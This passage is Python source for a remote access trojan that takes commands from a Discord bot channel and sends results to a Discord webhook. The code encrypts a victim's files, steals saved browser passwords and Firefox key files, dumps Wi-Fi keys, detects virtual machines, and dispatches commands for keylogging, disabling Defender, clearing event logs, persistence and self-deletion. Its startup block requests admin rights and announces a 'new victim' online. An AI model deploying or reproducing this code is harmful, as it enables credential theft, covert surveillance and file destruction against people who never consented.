        send_embed_to_discord(webhook_url, "Encryption Error", f"Path `{path}` is not a valid directory.", 0xFF0000)
        return

    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.encrypted'): # Avoid re-encrypting already encrypted files
                try:
                    encrypt_file(file_path, pwd)
                    files_encrypted += 1
                except Exception as e:
                    errors.append(str(e))
    
    if errors:
        error_msg = "\n".join(errors[:5]) + ("..." if len(errors) > 5 else "")
        send_embed_to_discord(webhook_url, "Encryption Finished with Errors", f"Encrypted {files_encrypted} files. Some errors occurred:\n```{error_msg}```", 0xFF0000)
    else:
        send_embed_to_discord(webhook_url, "Encryption Finished", f"Successfully encrypted {files_encrypted} files in `{path}`.", 0x00FF00)


def decryption(pwd, path, webhook_url):
    """Decrypts files in a given path that end with '.encrypted'."""
    def xor_cipher(data, key):
        return bytes(b ^ key for b in data)

    def generate_key(password):
        key = 0
        for char in password:
            key ^= ord(char)
        return key % 256

    def decrypt_file(encrypted_file_path, password):
        try:
            if not encrypted_file_path.endswith('.encrypted'):
                return # Skip non-encrypted files

            with open(encrypted_file_path, 'rb') as encrypted_file:
                data = encrypted_file.read()

            key = generate_key(password)
            decrypted_data = xor_cipher(data, key)

            decrypted_file_path = encrypted_file_path[:-10] # Remove '.encrypted' suffix

            with open(decrypted_file_path, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)

            os.remove(encrypted_file_path) # Delete encrypted file
            print(f"Decrypted and deleted encrypted file: {encrypted_file_path}")
        except Exception as e:
            raise Exception(f"Error decrypting file {encrypted_file_path}: {e}") # Re-raise

    print(f"Starting decryption for: {path}")
    send_embed_to_discord(webhook_url, "Decryption Status", f"Starting decryption for: `{path}`", 0xFFFF00)
    
    files_decrypted = 0
    errors = []
    if not os.path.isdir(path):
        send_embed_to_discord(webhook_url, "Decryption Error", f"Path `{path}` is not a valid directory.", 0xFF0000)
        return

    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith('.encrypted'):
                try:
                    decrypt_file(file_path, pwd)
                    files_decrypted += 1
                except Exception as e:
                    errors.append(str(e))

    if errors:
        error_msg = "\n".join(errors[:5]) + ("..." if len(errors) > 5 else "")
        send_embed_to_discord(webhook_url, "Decryption Finished with Errors", f"Decrypted {files_decrypted} files. Some errors occurred:\n```{error_msg}```", 0xFF0000)
    else:
        send_embed_to_discord(webhook_url, "Decryption Finished", f"Successfully decrypted {files_decrypted} files in `{path}`.", 0x00FF00)


def change_wallpaper(image_url, webhook_url):
    """Changes the victim's desktop wallpaper."""
    try:
        response = requests.get(image_url)
        if response.status_code == 200:
            temp_dir = os.path.join(os.getenv('TEMP'), 'wallpaper_temp')
            os.makedirs(temp_dir, exist_ok=True)
            image_path = os.path.join(temp_dir, 'wallpaper.bmp') # BMP is often most compatible

            with open(image_path, 'wb') as f:
                f.write(response.content)

            # SPI_SETDESKWALLPAPER = 20
            # SPIF_UPDATEINIFILE = 0x01
            # SPIF_SENDCHANGE = 0x02
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0x01 | 0x02)
            print(f"Wallpaper changed to: {image_path}")
            send_embed_to_discord(webhook_url, "Wallpaper Change", "Successfully changed desktop wallpaper.", 0x00FF00)

            # Clean up temporary files (moved to a separate thread for robustness)
            threading.Thread(target=lambda: (time.sleep(5), shutil.rmtree(temp_dir, ignore_errors=True)), daemon=True).start()
        else:
            print(f"Failed to download image from {image_url}. Status code: {response.status_code}")
            send_embed_to_discord(webhook_url, "Wallpaper Change Failed", f"Failed to download image from URL. Status: {response.status_code}", 0xFF0000)
    except Exception as e:
        print(f"Error changing wallpaper: {e}")
        send_embed_to_discord(webhook_url, "Wallpaper Change Failed", f"Error changing wallpaper: {e}", 0xFF0000)

def show_message_box(title, message, webhook_url):
    """Displays a message box on the victim's screen."""
    try:
        # MB_OK = 0x00000000 (OK button only)
        # MB_ICONINFORMATION = 0x00000040 (Information icon)
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x00000000 | 0x00000040)
        print(f"Message box displayed: Title='{title}', Message='{message}'")
        send_embed_to_discord(webhook_url, "Message Box", f"Message box displayed: Title='{title}'", 0x00FF00)
    except Exception as e:
        print(f"Error displaying message box: {e}")
        send_embed_to_discord(webhook_url, "Message Box Failed", f"Error displaying message box: {e}", 0xFF0000)

# --- Advanced Information Gathering ---

def get_browser_data(webhook_url):
    """Extracts credentials and data from common browsers (Chrome, Edge, Firefox)."""
    # This function is complex and requires specific knowledge of browser database structures.
    # It also often requires specific libraries (like pycryptodome for Chrome/Edge decryption).
    # For simplicity, this example will focus on *paths* and *basic extraction if possible*
    # but a full implementation is much more involved and outside the scope of this response.
    # ***Requires pywin32 for win32crypt (pip install pypiwin32)***

    browsers = {
        "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
        "Brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        "Firefox": os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles') # Firefox profiles are under a random string
    }

    temp_data_dir = os.path.join(os.getenv('TEMP'), 'browser_data')
    os.makedirs(temp_data_dir, exist_ok=True)
    zip_filename = os.path.join(os.getenv('TEMP'), 'browser_data.zip')

    def get_chrome_passwords(profile_path):
        login_data_path = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(login_data_path):
            return []

        # Copy to temp as original might be locked
        temp_db = os.path.join(temp_data_dir, 'Login Data_copy')
        try:
            shutil.copy2(login_data_path, temp_db)
        except Exception as e:
            print(f"Could not copy Chrome Login Data: {e}")
            return []

        passwords = []
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Decrypt password - requires win32crypt
                try:
                    # win32crypt.CryptUnprotectData returns (data, description, entropy)
                    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                    if url and username and decrypted_password:
                        passwords.append(f"URL: {url}, Username: {username}, Password: {decrypted_password}")
                except Exception as decrypt_e:
                    passwords.append(f"URL: {url}, Username: {username}, Password: [Decryption Failed: {decrypt_e}]")
            conn.close()
        except Exception as e:
            print(f"Error reading Chrome Login Data: {e}")
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
        return passwords

    def get_firefox_data(profile_path):
        # Firefox data extraction is more complex, involving key4.db and logins.json
        # This is a simplified placeholder.
        logins_json_path = os.path.join(profile_path, 'logins.json')
        key4_db_path = os.path.join(profile_path, 'key4.db')

        data_found = []
        if os.path.exists(logins_json_path) and os.path.exists(key4_db_path):
            data_found.append(f"Firefox profile found: {profile_path}")
            # In a real RAT, you'd parse logins.json and decrypt using key4.db
            # This requires more advanced crypto libraries and parsing.
            shutil.copy2(logins_json_path, os.path.join(temp_data_dir, os.path.basename(profile_path) + '_logins.json'))
            shutil.copy2(key4_db_path, os.path.join(temp_data_dir, os.path.basename(profile_path) + '_key4.db'))
            data_found.append(f"Copied logins.json and key4.db from {profile_path}")
        return data_found

    all_browser_data = {}

    for browser_name, path in browsers.items():
        if "Firefox" in browser_name:
            if os.path.exists(path):
                # Find actual profile directories (e.g., abcdefgh.default-release)
                for profile_dir in os.listdir(path):
                    full_profile_path = os.path.join(path, profile_dir)
                    if os.path.isdir(full_profile_path) and ("default" in profile_dir or "release" in profile_dir):
                        all_browser_data[f"{browser_name} - {profile_dir}"] = get_firefox_data(full_profile_path)
        else:
            if os.path.exists(path):
                chrome_passwords = get_chrome_passwords(path)
                if chrome_passwords:
                    all_browser_data[browser_name] = chrome_passwords
                else:
                    all_browser_data[browser_name] = ["No saved passwords found or decryption failed."]
            else:
                all_browser_data[browser_name] = ["Browser path not found."]

    # Write collected data to a text file
    output_file = os.path.join(temp_data_dir, "browser_data_report.txt")
    with open(output_file, 'w', encoding='utf-8', errors='ignore') as f:
        for browser, data in all_browser_data.items():
            f.write(f"--- {browser} ---\n")
            if isinstance(data, list):
                for item in data:
                    f.write(f"{item}\n")
            else:
                f.write(f"{data}\n")
            f.write("\n")

    # Zip the collected data
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(temp_data_dir):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, temp_data_dir))

    send_embed_to_discord(webhook_url, "Browser Data Extraction", "Attempting to extract browser data...", 0xFFFF00)
    if os.path.exists(zip_filename):
        webhook_upload(zip_filename, webhook_url, message="Extracted browser data (passwords, cookies, history).")
        shutil.rmtree(temp_data_dir, ignore_errors=True)
        os.remove(zip_filename)
    else:
        send_embed_to_discord(webhook_url, "Browser Data Extraction Failed", "Could not collect browser data.", 0xFF0000)

def get_wifi_passwords(webhook_url):
    """Extracts saved Wi-Fi profiles and passwords on Windows."""
    if sys.platform != "win32":
        send_embed_to_discord(webhook_url, "Wi-Fi Passwords", "This command is only for Windows systems.", 0xFF0000)
        return

    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", data)

        wifi_list = []
        for profile in profiles:
            profile = profile.strip()
            try:
                # Get password for each profile
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
                password_match = re.search(r"Key Content\s*:\s*(.*)", results)
                password = password_match[1].strip() if password_match else "None"
                wifi_list.append(f"Profile: {profile}, Password: {password}")
            except subprocess.CalledProcessError:
                wifi_list.append(f"Profile: {profile}, Password: [Error/No Password Found]")
        
        if wifi_list:
            wifi_str = "```\n" + "\n".join(wifi_list) + "\n```"
            if len(wifi_str) > 2000:
                wifi_str = wifi_str[:1900] + "\n... (truncated)" + "\n```"
            send_embed_to_discord(webhook_url, "Wi-Fi Passwords", wifi_str, 0x00FF00)
        else:
            send_embed_to_discord(webhook_url, "Wi-Fi Passwords", "No Wi-Fi profiles found.", 0xFFFF00)

    except Exception as e:
        print(f"Error getting Wi-Fi passwords: {e}")
        send_embed_to_discord(webhook_url, "Wi-Fi Passwords Failed", f"Error getting Wi-Fi passwords: {e}", 0xFF0000)

def get_installed_programs(webhook_url):
    """Lists installed programs on Windows."""
    if sys.platform != "win32":
        send_embed_to_discord(webhook_url, "Installed Programs", "This command is only for Windows systems.", 0xFF0000)
        return

    programs = []
    # Registry paths where programs are usually listed
    reg_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" # For 32-bit apps on 64-bit systems
    ]

    for path in reg_paths:
        try:
            for hkey in [reg.HKEY_LOCAL_MACHINE, reg.HKEY_CURRENT_USER]:
                try:
                    key = reg.OpenKey(hkey, path, 0, reg.KEY_READ)
                    i = 0
                    while True:
                        try:
                            subkey_name = reg.EnumKey(key, i)
                            subkey = reg.OpenKey(key, subkey_name)
                            
                            display_name = ""
                            try:
                                display_name = reg.QueryValueEx(subkey, "DisplayName")[0]
                            except FileNotFoundError:
                                pass # DisplayName not always present

                            if display_name and display_name not in programs:
                                programs.append(display_name)
                            reg.CloseKey(subkey)
                        except OSError:
                            break # No more subkeys
                        i += 1
                    reg.CloseKey(key)
                except FileNotFoundError:
                    continue # Registry path not found
                except Exception as e:
                    print(f"Error reading registry path {path} from {hkey}: {e}")
        except Exception as e:
            print(f"Overall error in get_installed_programs: {e}")

    if programs:
        programs_str = "```\n" + "\n".join(sorted(programs)) + "\n```"
        if len(programs_str) > 2000:
            programs_str = programs_str[:1900] + "\n... (truncated)" + "\n```"
        send_embed_to_discord(webhook_url, "Installed Programs", programs_str, 0x00FF00)
    else:
        send_embed_to_discord(webhook_url, "Installed Programs", "No installed programs found.", 0xFFFF00)


def check_for_vm(webhook_url):
    """Performs basic checks for virtual machine environments."""
    is_vm = False
    vm_indicators = []

    # Check for common VM-related files/directories
    vm_paths = [
        "C:\\Windows\\System32\\drivers\\vmmouse.sys", # VMware
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",  # VMware Shared Folders
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys", # VirtualBox
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys", # VirtualBox Guest Additions
        "C:\\Program Files\\VMware",
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions"
    ]
    for path in vm_paths:
        if os.path.exists(path):
            is_vm = True
            vm_indicators.append(f"Found VM file/directory: {path}")

    # Check registry keys for VMware/VirtualBox
    if sys.platform == "win32":
        try:
            # VMware
            key_vmware = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", 0, reg.KEY_READ)
            if "VMware" in reg.QueryValueEx(key_vmware, "Identifier")[0]:
                is_vm = True
                vm_indicators.append("Found VMware identifier in registry.")
            reg.CloseKey(key_vmware)
        except: pass
        try:
            # VirtualBox
            key_vbox = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", 0, reg.KEY_READ)
            if "VIRTUALBOX" in reg.QueryValueEx(key_vbox, "SystemProductName")[0].upper():
                is_vm = True
                vm_indicators.append("Found VirtualBox product name in BIOS registry.")
            reg.CloseKey(key_vbox)
        except: pass

    # Check for common VM processes (e.g., VMwareService.exe, VBoxService.exe)
    for proc in psutil.process_iter(['name']):
        process_name = proc.info['name'].lower()
        if 'vmware' in process_name or 'vbox' in process_name or 'qemu' in process_name:
            is_vm = True
            vm_indicators.append(f"Found VM process: {process_name}")

    if is_vm:
        indicators_str = "\n".join(vm_indicators)
        send_embed_to_discord(webhook_url, "VM Detection", f"Potentially running in a Virtual Machine!\n```{indicators_str}```", 0xFFFF00)
    else:
        send_embed_to_discord(webhook_url, "VM Detection", "No strong indications of a Virtual Machine detected.", 0x00FF00)


# --- Main Logic ---

def process_command(command_message):
    """Parses and executes commands from Discord."""
    global keylogger_running

    command = command_message['content'].strip()
    message_id = command_message['id']
    print(f"Received command: {command} (ID: {message_id})")
    
    # Mark the message as read/processed by reacting with an emoji
    try:
        react_url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages/{message_id}/reactions/%E2%9D%8C/%40me" # Red X mark
        headers = {'Authorization': f'Bot {TOKEN}'}
        requests.put(react_url, headers=headers)
    except Exception as e:
        print(f"Failed to react to message: {e}")

    parts = command.split(' ')
    cmd = parts[0]

    if cmd == '/mass-upload':
        massupload(MAIN_WEBHOOK_URL)
    elif cmd == '/screen-update':
        take_screenshot(os.path.join(os.getenv('TEMP'), 'screenshots'), MAIN_WEBHOOK_URL)
    elif cmd == '/quick-info':
        basic_info_network(MAIN_WEBHOOK_URL)
    elif cmd == '/start-keylogger':
        start_keylogger(MAIN_WEBHOOK_URL)
    elif cmd == '/stop-keylogger':
        stop_keylogger()
    elif cmd == '/hunt':
        if len(parts) >= 2:
            filename = parts[1]
            hunt_file(filename, MAIN_WEBHOOK_URL)
        else:
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/hunt <filename>`", 0xFF0000)
    elif cmd == '/kill':
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Self-Destruct", "Initiating self-destruction...", 0xFF0000)
        delete_self()
    elif cmd == '/system-info':
        sys_info(MAIN_WEBHOOK_URL)
    elif cmd == '/add-startup':
        add_to_startup_windows()
    elif cmd == '/shutdown':
        shutdown_computer()
    elif cmd == '/disable-defender':
        disable_defender()
    elif cmd == '/clear-logs':
        clear_event_logs()
    elif cmd == '/get-browsers':
        get_browser_data(MAIN_WEBHOOK_URL)
    elif cmd == '/get-wifi':
        get_wifi_passwords(MAIN_WEBHOOK_URL)
    elif cmd == '/get-programs':
        get_installed_programs(MAIN_WEBHOOK_URL)
    elif cmd == '/encrypt':
        try:
            pwd_index = parts.index('-p')
            file_index = parts.index('-f')
            pwd = parts[pwd_index + 1]
            # Reconstruct path as it might contain spaces and be quoted
            path = command[command.find('-f "') + 4:command.rfind('"')]
            if pwd and path:
                encryption(pwd, path, MAIN_WEBHOOK_URL)
            else:
                send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/encrypt -p <password> -f \"<directory>\"`", 0xFF0000)
        except ValueError:
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/encrypt -p <password> -f \"<directory>\"`", 0xFF0000)
    elif cmd == '/decrypt':
        try:
            pwd_index = parts.index('-p')
            file_index = parts.index('-f')
            pwd = parts[pwd_index + 1]
            path = command[command.find('-f "') + 4:command.rfind('"')]
            if pwd and path:
                decryption(pwd, path, MAIN_WEBHOOK_URL)
            else:
                send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/decrypt -p <password> -f \"<directory>\"`", 0xFF0000)
        except ValueError:
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/decrypt -p <password> -f \"<directory>\"`", 0xFF0000)
    elif cmd == '/wallpaper':
        if len(parts) >= 2:
            image_url = parts[1]
            change_wallpaper(image_url, MAIN_WEBHOOK_URL)
        else:
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/wallpaper <image_url>`", 0xFF0000)
    elif cmd == '/message':
        if len(parts) >= 3:
            title = parts[1]
            message = ' '.join(parts[2:])
            show_message_box(title, message, MAIN_WEBHOOK_URL)
        else:
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Error", "Usage: `/message <title> <your message>`", 0xFF0000)
    elif cmd == '/help':
        send_help(MAIN_WEBHOOK_URL)
    else:
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Unknown Command", f"Command `{command}` not recognized. Type `/help` for a list of commands.", 0xFF0000)

def command_listener():
    """Continuously listens for commands from Discord."""
    last_command_id = None
    bot_user_id = get_bot_user_id()

    while True:
        try:
            latest_message = get_latest_command_message()
            if latest_message and latest_message['id'] != last_command_id and latest_message['author']['id'] != bot_user_id:
                print(f"New command detected: {latest_message['content']}")
                command_queue.put(latest_message)
                last_command_id = latest_message['id']
            time.sleep(3) # Check for new commands every 3 seconds
        except Exception as e:
            print(f"Error in command listener: {e}")
            time.sleep(10) # Wait longer on error

def command_executor():
    """Executes commands from the queue."""
    while True:
        if not command_queue.empty():
            command_message = command_queue.get()
            try:
                process_command(command_message)
            except Exception as e:
                print(f"Error executing command '{command_message['content']}': {e}")
                send_embed_to_discord(MAIN_WEBHOOK_URL, "Command Execution Error", f"Failed to execute command `{command_message['content']}`: {e}", 0xFF0000)
        time.sleep(1) # Small delay to prevent busy-waiting


if __name__ == "__main__":
    import platform # Imported here for sys_info

    # Initial check for admin rights and re-run if necessary
    if sys.platform == "win32" and not is_admin():
        run_as_admin()

    # Initial system information and persistence attempt
    print("RAT started. Attempting initial setup...")
    send_embed_to_discord(MAIN_WEBHOOK_URL, "RAT Online", f"New victim online! User: `{os.getlogin()}` on `{platform.system()} {platform.release()}`", 0x00FF00)
    
    # Check for VM to potentially alter behavior or alert attacker
    check_for_vm(MAIN_WEBHOOK_URL)

    # Attempt to add to startup
    if sys.platform == "win32":
        add_to_startup_windows()

    # Start command listener and executor threads
    threading.Thread(target=command_listener, daemon=True).start()
    threading.Thread(target=command_executor, daemon=True).start()

    # Keep the main thread alive
    while True:
        time.sleep(1)